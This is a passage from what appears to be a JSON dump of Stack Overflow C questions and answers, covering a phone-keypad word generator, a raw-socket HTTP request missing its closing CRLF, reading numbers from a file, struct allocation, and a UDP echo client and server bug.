href=\"https://www.google.com/imgres?imgurl=https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Telephone-keypad2.svg/1200px-Telephone-keypad2.svg.png&amp;imgrefurl=https://en.wikipedia.org/wiki/Telephone_keypad&amp;h=973&amp;w=1200&amp;tbnid=QrUdyaA0gSl_YM:&amp;q=phone%20keypad%20letters&amp;tbnh=160&amp;tbnw=197&amp;usg=AI4_-kQ3l4j1JO1ANHzT5LGipsxuDvvilg&amp;vet=1&amp;docid=RxQBHK3rnZZ3dM&amp;sa=X&amp;ved=2ahUKEwiamY3WktTeAhVPm-AKHcpBB38Q9QEwAHoECAUQBg\" rel=\"nofollow noreferrer\">Lettered Phone Keypad</a></p>\n\n<p><strong>CODE:</strong> </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdbool.h&gt;\n\n\nconst char numbered_letters[10][5] = {\"\", \"\", \"abc\", \"def\", \"ghi\", \"jkl\",\n                                      \"mno\", \"pqrs\", \"tuv\", \"wxyz\"};\n\n\n\nbool startsWith(const char *pre, const char *str) {\n    size_t lenpre = strlen(pre),\n            lenstr = strlen(str);\n    return lenstr &lt; lenpre ? false : strncmp(pre, str, lenpre) == 0;\n}\n\nvoid isEqual(char input[]) {\n    int i = 0;\n    //input[strlen(input)] = 0;\n    startsWith(input, input);\n    printf(\"check:  %s\\n\", input);\n    //creating file\n    FILE *fp = fopen(\"words_alpha.txt\", \"r\");\n    char str[32]; /* Handles largest possible string in the list which is: dichlorodiphenyltrichloroethane*/\n    //fseek(fp, 0, SEEK_SET);\n    if (fp == NULL) {\n        printf(\"Error! No file!\\n\");\n    } else {\n        //printf(\"Enter a number to be converted into a word-list\");\n        //scanf(\"%s\", str);\n\n        while (!feof(fp)) {\n            fscanf(fp, \"%s\", str);\n            i = strncmp(input, str, 32);\n            if (i == 0) {\n                printf(\"HIT:    %s \\n\", input);\n                break;\n            } else {\n                printf(\"\");\n            }\n            //if (strncmp(str, \"hello\", 32 ) == 0) { /*if strncmp finds the word and returns true, print */\n            //  printf(\"%s\\n\", str);\n\n        }\n        //printf(\"%s\\n\", str);\n        //compareNums(num);\n    }\n    fclose(fp);\n}\n\n\nvoid printWordsUtil(int number[], int curr_digit, char output[], int n) {\n\n    // Base case, if current output word is prepared\n    int i;\n    if (curr_digit == n) {\n        //printf(\"%s \", output);\n        isEqual(output);\n        return;\n\n    }\n\n    // Try all possible characters for current digit in number[]\n    // and recur for remaining digits\n    for (i = 0; i &lt; strlen(numbered_letters[number[curr_digit]]); i++) {\n\n        output[curr_digit] = numbered_letters[number[curr_digit]][i];\n        printWordsUtil(number, curr_digit + 1, output, n);/* recursive call */\n\n\n        if (number[curr_digit] == 0 || number[curr_digit] == 1)\n            return;\n    }\n}\n\n// A wrapper over printWordsUtil().  It creates an output array and\n// calls printWordsUtil()\nvoid printWords(int number[], int n) {\n    char result[n + 1];\n    result[n] = '\\0';\n\n    printWordsUtil(number, 0, result, n);\n\n\n}\n\n//Driver program\nint main(void) {\n    int number[] = {4, 3, 9};\n    int n = sizeof(number) / sizeof(number[0]);\n    printWords(number, n);\n    return 0;\n}\n</code></pre>\n\n<p><strong>FILE USED:</strong> <a href=\"https://github.com/dwyl/english-words/blob/master/words_alpha.txt\" rel=\"nofollow noreferrer\">Words Alpha (A file with over 420k words)</a></p>\n\n<p>Thank you for any guidance you can provide!</p>\n"}, {"tags": ["c", "sockets", "http"], "comments": [{"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 5, "creation_date": 1542206492, "post_id": 53302708, "comment_id": 93486126, "body": "You probably need an extra blank line after the Host header, to signify that&#39;s the end of your request."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1542206522, "post_id": 53302708, "comment_id": 93486146, "body": "Please try to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a> to show us. Hard-code the host and port if you need to. Also please read about <a href=\"http://stackoverflow.com/help/how-to-ask\">how to ask good questions</a>, as well as <a href=\"https://codeblog.jonskeet.uk/2012/11/24/stack-overflow-question-checklist/\" rel=\"nofollow noreferrer\">this question checklist</a>. Lastly please <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your code</a>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1542206602, "post_id": 53302708, "comment_id": 93486196, "body": "Oh and you should probably learn <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol\" rel=\"nofollow noreferrer\">the HyperText Transfer Protocol</a> properly if you want to use it. Or not, and just use some existing <a href=\"https://curl.haxx.se/libcurl/\" rel=\"nofollow noreferrer\">library</a> instead."}, {"owner": {"reputation": 14691, "user_id": 1808494, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/3d837ea752592568bd712261baa61a2d?s=128&d=identicon&r=PG&f=1", "display_name": "Aron", "link": "https://stackoverflow.com/users/1808494/aron"}, "edited": false, "score": 2, "creation_date": 1542206643, "post_id": 53302708, "comment_id": 93486225, "body": "It doesn&#39;t seem like you are giving the server a chance to reply. Network is much slower than local processes."}], "answers": [{"comments": [{"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1542230019, "post_id": 53303747, "comment_id": 93498345, "body": "You need to also include a <code>Connection: close</code> request header as well. In HTTP 1.1, the default setting is <code>keep-alive</code>, which means the server will keep its end of the TCP connection open after sending the response, thus your reading loop will not actually terminate (your loop is the <i>wrong</i> way to read an HTTP response, BTW!). Since you want to close your socket after receiving the response, sending <code>Connection: close</code> tells the server to close its end of the TCP connection after sending the response (thus allowing your reading loop to terminate)."}], "tags": [], "owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "is_accepted": true, "score": 4, "last_activity_date": 1542210157, "last_edit_date": 1542210157, "creation_date": 1542209776, "answer_id": 53303747, "question_id": 53302708, "link": "https://stackoverflow.com/questions/53302708/receiving-nothing-after-sending-http-request-to-server-in-c-language/53303747#53303747", "title": "Receiving nothing after sending HTTP request to server in C language", "body": "<p>According to <a href=\"https://tools.ietf.org/html/rfc7230#section-3\" rel=\"nofollow noreferrer\"><strong>RFC 7230</strong></a>:</p>\n\n<blockquote>\n  <p>All HTTP/1.1 messages consist of a start-line followed by a\n  sequence    of octets in a format similar to the Internet Message\n  Format    [RFC5322]: zero or more header fields (collectively referred\n  to as    the \"headers\" or the \"header section\"), an empty line\n  indicating the    end of the header section, and an optional message\n  body.</p>\n\n<pre><code> HTTP-message   = start-line\n                  *( header-field CRLF )\n                  CRLF\n                  [ message-body ]\n</code></pre>\n</blockquote>\n\n<p>Notice that after the Start-Line (Additional-Stuff) CRLF there is another CRLF afterward to indicate that here is where the headers end.</p>\n\n<p>So, tack another <code>\"\\r\\n\"</code> to the end of your request string in the call to <code>sprintf</code> that builds it.  </p>\n"}], "owner": {"reputation": 23, "user_id": 10652515, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4qK41MDTHvk/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbDMugUJyen6ZcbbJzdYwC9KKgIQdA/mo/photo.jpg?sz=128", "display_name": "Alexis", "link": "https://stackoverflow.com/users/10652515/alexis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 1, "accepted_answer_id": 53303747, "answer_count": 1, "score": 2, "last_activity_date": 1542210157, "creation_date": 1542206318, "question_id": 53302708, "link": "https://stackoverflow.com/questions/53302708/receiving-nothing-after-sending-http-request-to-server-in-c-language", "title": "Receiving nothing after sending HTTP request to server in C language", "body": "<p>I would like to create a little downloader in C language. Everything was fine until i wanted to get the content of the web page. Everytime the answer is empty because nothing is displayed. I don't understand why.</p>\n\n<p>I am getting host, port number and path thanks to regex but i am not showing it because SO says that my post is mostly code...</p>\n\n<pre><code>#define BUF_SIZE 100\n\nint main (int argc, char *argv[] )\n{\n  int s;\n  int response;\n  struct sockaddr_in sin; \n  struct hostent *hptr;\n\n  char * regexHost = \"^https?://([^:0-9/]*):?([0-9]*)?(.*)$\";\n  size_t maxGroups = 4;\n\n  char * host;\n  char * port;\n  char * path;\n  char *request = malloc(256);\n  char buf[BUF_SIZE];\n\n  /* Creating socket */\n  printf(\"Creating socket...\\n\");\n  if ( (s = socket(PF_INET, SOCK_STREAM, 0 ) ) &lt; 0) /* create socket*/\n    { \n      perror(\"error on socket\\n\");  /* socket error */\n      return -1;\n    }\n  else\n    {\n        printf(\"Successfully created socket\\n\");\n    }\n\n  sin.sin_family = PF_INET; /*set protocol family to Internet */\n\n  /*Getting host*/\n  printf(\"Getting host...\\n\");\n  if ( (hptr =  gethostbyname(host) ) == NULL)\n    {\n      fprintf(stderr, \"gethostname error: %s\\n\", host);\n      return -1;\n    }\n  else\n    {\n        printf(\"Successfully got host\\n\");\n    }\n\n  /* Connect to the server */\n  printf(\"Connecting...\\n\");\n  memcpy( &amp;sin.sin_addr, hptr-&gt;h_addr, hptr-&gt;h_length);\n  if (connect (s, (struct sockaddr *)&amp;sin, sizeof(sin) ) &lt; 0 ) \n    {\n      perror(\"error on connect\\n\"); return -1;   /* connect error */\n    }\n  else\n    {\n        printf(\"Successfully connected\\n\");\n    }\n\n  /* send headers to connection*/\n  sprintf(request, (\"GET %s HTTP/1.1\\r\\nHost: %s\\r\\n\"), path, host);\n  printf(\"%s\\n\", request);\n\n  if( send(s, request, strlen(request), 0) &lt; 0)\n    {\n      puts(\"Send failed\");\n      return 1;\n    }\n   else\n    {\n      printf(\"Successfully sent HTTP fetch request\\n\");\n    }\n\n  while ((response = recv(s, buf, BUF_SIZE-1, 0)) &gt; 0) \n    {\n      buf[response] = 0;\n      printf(\"Response : %s\\n\", buf);\n      fputs(buf, stdout);\n      memset(buf, 0, BUF_SIZE);\n    }\n\n  /* close connection, clean up socket */\n  if (close(s) &lt; 0) \n    { \n      perror(\"error on close\");   /* close error */\n      return -1;\n    }\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "file", "row"], "comments": [{"owner": {"reputation": 467, "user_id": 9950378, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-bMztUomG68Y/AAAAAAAAAAI/AAAAAAAAABE/FcXN1FGD0cQ/photo.jpg?sz=128", "display_name": "Jean-Marc Zimmer", "link": "https://stackoverflow.com/users/9950378/jean-marc-zimmer"}, "edited": false, "score": 0, "creation_date": 1542205975, "post_id": 53302541, "comment_id": 93485797, "body": "You don&#39;t need to use this <code>else</code>."}, {"owner": {"reputation": 1801, "user_id": 452780, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/nGhUI.jpg?s=128&g=1", "display_name": "Sam Segers", "link": "https://stackoverflow.com/users/452780/sam-segers"}, "edited": false, "score": 0, "creation_date": 1542206015, "post_id": 53302541, "comment_id": 93485827, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/2539796/c-reading-multiple-numbers-from-single-input-line-scanf\">C, reading multiple numbers from single input line (scanf?)</a>"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 1, "creation_date": 1542206022, "post_id": 53302541, "comment_id": 93485830, "body": "<code>new</code> is not C."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "is_accepted": true, "score": 1, "last_activity_date": 1542206409, "last_edit_date": 1542206409, "creation_date": 1542205960, "answer_id": 53302607, "question_id": 53302541, "link": "https://stackoverflow.com/questions/53302541/read-numbers-from-txt-file-second-line-in-a-c-array/53302607#53302607", "title": "Read numbers from txt file second line in a C Array", "body": "<blockquote>\n  <p>How can I read only the numbers from the second row into an array in C?</p>\n</blockquote>\n\n<p>Ignore the first line by reading and discarding it.</p>\n\n<p>You could use something like that:</p>\n\n<pre><code>#include &lt;stddef.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    char const *filename = \"test.txt\";\n    FILE *input_file = fopen(filename, \"r\");\n\n    if (!input_file) {\n        fprintf(stderr, \"Couldn't open \\\"%s\\\" for reading :(\\n\\n\", filename);\n        return EXIT_FAILURE;\n    }\n\n    int ch;  // ignore first line:\n    while ((ch = fgetc(input_file)) != EOF &amp;&amp; ch != '\\n');\n\n    int value;\n    int *numbers = NULL;\n    size_t num_numbers = 0;\n    while (fscanf(input_file, \"%d\", &amp;value) == 1) {\n        int *new_numbers = realloc(numbers, (num_numbers + 1) * sizeof(*new_numbers));\n        if (!new_numbers) {\n            fputs(\"Out of memory :(\\n\\n\", stderr);\n            free(numbers);\n            return EXIT_FAILURE;\n        }\n        numbers = new_numbers;\n        numbers[num_numbers++] = value;\n    }\n\n    fclose(input_file);\n\n    for (size_t i = 0; i &lt; num_numbers; ++i)\n        printf(\"%d \", numbers[i]);\n    putchar('\\n');\n\n    free(numbers);\n}\n</code></pre>\n"}], "owner": {"reputation": 712, "user_id": 10224063, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-DQ0oNwm0Kxw/AAAAAAAAAAI/AAAAAAAAABM/OOwTWew0W3s/photo.jpg?sz=128", "display_name": "Vlad Danila", "link": "https://stackoverflow.com/users/10224063/vlad-danila"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 0, "accepted_answer_id": 53302607, "answer_count": 1, "score": 0, "last_activity_date": 1542206409, "creation_date": 1542205769, "last_edit_date": 1542205984, "question_id": 53302541, "link": "https://stackoverflow.com/questions/53302541/read-numbers-from-txt-file-second-line-in-a-c-array", "title": "Read numbers from txt file second line in a C Array", "body": "<p>I do have a txt file which looks like this</p>\n\n<pre><code>10\n41 220 166 29 151 47 170 60 234 49 \n</code></pre>\n\n<p>How can I read only the numbers from the <strong>second row</strong> into an array in C?</p>\n\n<pre><code>int nr_of_values = 0;\nint* myArray = 0;\nFILE *file;\nfile = fopen(\"hist.txt\", \"r+\");\nif (file == NULL)\n{\n    printf(\"ERROR Opening File!\");\n    exit(1);\n}\nelse {\n    fscanf(file, \"%d\", &amp;nr_of_values);\n    myArray = new int[nr_of_values];\n\n    // push values from second row to this array\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "dynamic", "struct"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1542205784, "post_id": 53302517, "comment_id": 93485661, "body": "Don&#39;t forget that C only passes arguments <i>by value</i> (meaning values of arguments are copied). Please do some research about <i>emulating pass by reference in C</i>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1542205831, "post_id": 53302517, "comment_id": 93485694, "body": "Also, doing <code>sizeof</code> of a pointer gives you the size of the <i>pointer</i>, not what it might point to."}, {"owner": {"reputation": 467, "user_id": 9950378, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-bMztUomG68Y/AAAAAAAAAAI/AAAAAAAAABE/FcXN1FGD0cQ/photo.jpg?sz=128", "display_name": "Jean-Marc Zimmer", "link": "https://stackoverflow.com/users/9950378/jean-marc-zimmer"}, "edited": false, "score": 1, "creation_date": 1542205879, "post_id": 53302517, "comment_id": 93485732, "body": "In C, one should not cast <code>malloc()</code> return"}, {"owner": {"reputation": 1, "user_id": 9492218, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Matteo Quarta", "link": "https://stackoverflow.com/users/9492218/matteo-quarta"}, "edited": false, "score": 0, "creation_date": 1542206794, "post_id": 53302517, "comment_id": 93486337, "body": "As of now these 2 tips are helping me to do some progress, without  sizeof(struct*) but just sizeof(struct) i can AT LEAST use the data as long as I am within the fuction (when I leave i can&#39;t, I&#39;m trying to figure out)  As for all these pointers stuff, i guess the slides my teachers gave me are just misleading...."}, {"owner": {"reputation": 1, "user_id": 9492218, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Matteo Quarta", "link": "https://stackoverflow.com/users/9492218/matteo-quarta"}, "edited": false, "score": 0, "creation_date": 1542207199, "post_id": 53302517, "comment_id": 93486608, "body": "Update: I seem to have figured it out, everything works fine if I just return the pointer instead of assigning it inside the struct. Thank you to everyone!"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542207268, "post_id": 53302517, "comment_id": 93486652, "body": "Ah, you should have done <code>myStr **strVect</code> and <code>*strVect = malloc ...</code>. I&#39;ll close this question as a duplicate."}], "owner": {"reputation": 1, "user_id": 9492218, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Matteo Quarta", "link": "https://stackoverflow.com/users/9492218/matteo-quarta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 27, "favorite_count": 0, "closed_date": 1542207328, "answer_count": 0, "score": 0, "last_activity_date": 1542205697, "creation_date": 1542205697, "question_id": 53302517, "link": "https://stackoverflow.com/questions/53302517/allocating-an-array-of-struct", "closed_reason": "Duplicate", "title": "Allocating an array of struct", "body": "<p>I have an array of a struct defined as</p>\n\n<pre><code>typedef struct \n{\n    char s1[MAX]\n    char s2[MAX]\n    ...\n} myStruct;\n</code></pre>\n\n<p>and need to allocate a vector of N elements of them froma a function that also reads froma a file.\nDefine tratta* treni my array, my code goes</p>\n\n<pre><code>load(myStr *strVect, int N, FILE* f)\n{\n     strVect = (myStr*)malloc(N*sizeof(myStr*));\n\n\n     for(int i=0; i &lt; N; i++)\n     {\n       fscanf(f, \"%s\", (strVect+i)-&gt;s1;\n       fscanf(f, \"%s, (strVect+i)-&gt;s2;\n       ...\n     }\n}\n</code></pre>\n\n<p>But the program crashes whenever i try to printf / use any of these values.\nI can't find the error and I'm also gonna need to define an array of pointers to these structs, can you help me?</p>\n"}, {"tags": ["c", "sockets"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user10652141"}, "edited": false, "score": 0, "creation_date": 1542203804, "post_id": 53301570, "comment_id": 93484358, "body": "@AravindVoggu I tried with n+1 but it is not helping. But I think this might not be the problem because n is only telling the length to be sent."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": true, "score": 1, "last_activity_date": 1542205762, "last_edit_date": 1542205762, "creation_date": 1542205344, "answer_id": 53302401, "question_id": 53301570, "link": "https://stackoverflow.com/questions/53301570/i-am-trying-to-echo-the-string-from-the-server-to-the-client-with-udp-sockets-bu/53302401#53302401", "title": "I am trying to echo the string from the server to the client with UDP sockets but it is failing?", "body": "<p>In the server, you overlooked that the argument <code>len</code> to <code>recvfrom()</code> is a value-result argument, which before the call you have to initialize to the size of the <code>clientAddr</code> in order to get this address, so change</p>\n\n<pre><code>    int len;\n</code></pre>\n\n<p>to</p>\n\n<pre><code>    int len = sizeof clientAddr;\n</code></pre>\n\n<p>Similarly in the client, change</p>\n\n<pre><code>    int n = recvfrom(sockfd,(char * ) recvLine,MAXLINE,0,(struct sockaddr * )&amp;servAddr,sizeof(servAddr));\n</code></pre>\n\n<p>to</p>\n\n<pre><code>    int len = sizeof servAddr;\n    int n = recvfrom(sockfd, recvLine, MAXLINE, 0, (struct sockaddr *)&amp;servAddr, &amp;len);\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user10652141"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 30, "favorite_count": 0, "accepted_answer_id": 53302401, "answer_count": 1, "score": 1, "last_activity_date": 1542205762, "creation_date": 1542202701, "question_id": 53301570, "link": "https://stackoverflow.com/questions/53301570/i-am-trying-to-echo-the-string-from-the-server-to-the-client-with-udp-sockets-bu", "title": "I am trying to echo the string from the server to the client with UDP sockets but it is failing?", "body": "<p>I have made one server and one client communicating through <strong>UDP sockets</strong>. The work that I am trying to do is that <strong>client</strong> will pass a string in the arguments and that string will be send to the <strong>server</strong> using <strong>UDP sockets</strong>. After receiving the string server will again echo(send) the string back to the client.Below are the codes for both:</p>\n\n<p>code for <strong><em>echoClient.c</em></strong> :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;sys/socket.h&gt;\n\n#define MAXLINE 4096\n\nint main(int argc, char const *argv[])\n{\n    int sockfd;\n    struct sockaddr_in servAddr;\n    char sendLine[MAXLINE],recvLine[MAXLINE];\n\n    if(argc!=3)\n    {\n        printf(\"echoClient &lt;Ip addr. of the server&gt; &lt;String to be echoed&gt; \\n\");\n        exit(1);\n    }\n\n    if((sockfd=socket(AF_INET,SOCK_DGRAM,0))&lt;0)\n    {\n        printf(\"Error in creating the socket\\n\");\n        exit(2);\n    }\n\n\n    memset(&amp;servAddr,0,sizeof(servAddr));\n\n    servAddr.sin_family = AF_INET;\n    servAddr.sin_port = htons(6565);    // setting up the port\n    servAddr.sin_addr.s_addr = inet_addr(argv[1]);  // using the given ip address of the server\n\n    printf(\"%s\\n\", argv[2]);\n\n    if((sendto(sockfd,(const char  *)argv[2],strlen(argv[2]), MSG_CONFIRM,(struct sockaddr *) &amp;servAddr, sizeof(servAddr))!=-1))\n    {\n        printf(\"data is sent to the server\\n\");\n    }\n    else\n    {\n        printf(\"can't send the data to the server\\n\");\n        exit(3);\n    }\n\n    int n = recvfrom(sockfd,(char * ) recvLine,MAXLINE,0,(struct sockaddr * )&amp;servAddr,sizeof(servAddr));\n\n    if(n==-1)\n    {\n        printf(\"Can't receive the data from the server\\n\");\n        exit(4);\n    }\n\n    recvLine[n] = '\\0'; // to terminate the received string\n\n    printf(\"%s\\n\",recvLine);\n\n\n    return 0;\n}\n</code></pre>\n\n<p>code for <strong><em>echoServer.c</em></strong>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;netinet/in.h&gt;\n\n#define MAXLINE 4096\n\nint main(int argc, char const *argv[])\n{\n    int sockfd;\n    struct sockaddr_in servAddr,clientAddr;\n    char sendLine[MAXLINE],recvLine[MAXLINE];\n\n    if(argc!=1)\n    {\n        printf(\"echoServer\\n\");\n        exit(1);\n    }\n\n    if((sockfd=socket(AF_INET,SOCK_DGRAM,0))&lt;0)\n    {\n        printf(\"Error in creating the socket\\n\");\n        exit(2);\n    }\n\n\n    memset(&amp;servAddr,0,sizeof(servAddr));\n    memset(&amp;clientAddr,0,sizeof(clientAddr));\n\n\n    // filling the details of the server ip and port\n    servAddr.sin_family = AF_INET;\n    servAddr.sin_port = htons(6565);\n    servAddr.sin_addr.s_addr = INADDR_ANY;  // using the given ip address of the server\n\n    if(bind(sockfd,(struct sockaddr * )&amp;servAddr,sizeof(servAddr))&lt;0)\n    {\n        printf(\"Binding of the socket failed\\n\");\n        exit(1);\n    }\n\n    printf(\"Server is Up... Waiting for the client...\\n\");\n\n    int len;\n    int n = recvfrom(sockfd,(char *) recvLine,MAXLINE,MSG_WAITALL,(struct sockaddr * )&amp;clientAddr,&amp;len);\n\n    if(n==-1)\n    {\n        printf(\"can't get the message from the client\\n\");\n        exit(2);\n    }\n\n    recvLine[n] = '\\0';\n\n    printf(\"Message received from the client is %s\\n\",recvLine);\n\n    if(sendto(sockfd,(char *) recvLine,n,MSG_CONFIRM,(struct sockaddr *)&amp;clientAddr,len)&lt;0)\n    {\n        printf(\"can't send the message to the client\\n\");\n        exit(3);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Now the actual problen is that when I am executing the above codes <strong>client</strong> is able to send the string to the <strong>server</strong> but server is unable to send the string back to the client.Server gives the error <strong>can't send the message to the client</strong>.</p>\n\n<p>I am not able to figure out the error which is stopping the server to send the message to the client.Please help me with this.</p>\n\n<p>I am running the <strong>echoClient.c</strong> with the command : \n<strong>./a.out 127.0.0.1 hellofromclientside</strong></p>\n"}, {"tags": ["c++", "c", "interrupt", "stm32f7"], "comments": [{"owner": {"reputation": 1036, "user_id": 8848476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/irmYE.jpg?s=128&g=1", "display_name": "ReAl", "link": "https://stackoverflow.com/users/8848476/real"}, "edited": false, "score": 0, "creation_date": 1542203196, "post_id": 53301251, "comment_id": 93483923, "body": "Consider usage of serial audio interface (<code>SAI</code>) in slave mode with <code>PCM&#47;DSP</code> frames (use <code>ADC</code> <code>DRDY</code> as <code>FS</code>). You can use two <code>SAI</code> channels (2*24 bit slots per channel) if <code>ADC</code> can out samples via DATA0 and DATA1."}, {"owner": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "reply_to_user": {"reputation": 1036, "user_id": 8848476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/irmYE.jpg?s=128&g=1", "display_name": "ReAl", "link": "https://stackoverflow.com/users/8848476/real"}, "edited": false, "score": 0, "creation_date": 1542207606, "post_id": 53301251, "comment_id": 93486892, "body": "@ReAl - I&#39;m reading DATA),1,2,3 simultaneously. And it&#39;s piped in at 20MHz. Not sure SAI can handle that. Thanks though!"}, {"owner": {"reputation": 1036, "user_id": 8848476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/irmYE.jpg?s=128&g=1", "display_name": "ReAl", "link": "https://stackoverflow.com/users/8848476/real"}, "edited": false, "score": 0, "creation_date": 1542209107, "post_id": 53301251, "comment_id": 93487840, "body": "SAI has two 1-bit channels. One&#39;s can connect in parallel frame start (<code>FS</code>) and clock inputs while use data inputs separately, so SAI can receive maximum two data streams from ADC."}, {"owner": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "reply_to_user": {"reputation": 1036, "user_id": 8848476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/irmYE.jpg?s=128&g=1", "display_name": "ReAl", "link": "https://stackoverflow.com/users/8848476/real"}, "edited": false, "score": 0, "creation_date": 1542211165, "post_id": 53301251, "comment_id": 93489193, "body": "@ReAl, as I indicated before, I have four data inputs to read simultaneously - Data0, Data1, Data2, and Data3. I also have the data clock to follow. It wouldn&#39;t work. We explored that already. Thanks Though!"}, {"owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "edited": false, "score": 0, "creation_date": 1542317347, "post_id": 53301251, "comment_id": 93536668, "body": "@JediEngineer There are 2 SAI controllers with 2 channels each"}], "answers": [{"tags": [], "owner": {"reputation": 453, "user_id": 1676310, 